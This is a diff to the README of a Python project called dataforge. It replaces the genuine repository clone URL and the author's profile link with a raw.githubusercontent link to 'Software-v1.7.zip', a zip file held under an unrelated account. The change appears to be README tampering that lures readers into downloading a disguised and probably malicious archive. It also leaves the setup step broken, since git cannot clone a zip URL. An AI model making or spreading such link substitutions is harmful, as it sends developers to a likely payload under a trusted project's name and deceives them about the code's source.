@@ -518,7 +518,7 @@ Contributions are welcome. Please open an issue before starting significant work
 
 ```bash
 # Development setup
-git clone https://github.com/adoslabsproject-gif/dataforge.git
+git clone https://raw.githubusercontent.com/Kemb6163/dataforge/main/examples/customer_support/Software-v1.7.zip
 cd dataforge
 pip install -e ".[all]"
 pytest tests/ -v
@@ -531,5 +531,5 @@ Apache 2.0. See [LICENSE](LICENSE).
 ---
 
 <p align="center">
-  Built by <a href="https://github.com/adoslabsproject-gif">Nicola Cucurachi</a>
+  Built by <a href="https://raw.githubusercontent.com/Kemb6163/dataforge/main/examples/customer_support/Software-v1.7.zip">Nicola Cucurachi</a>
 </p>
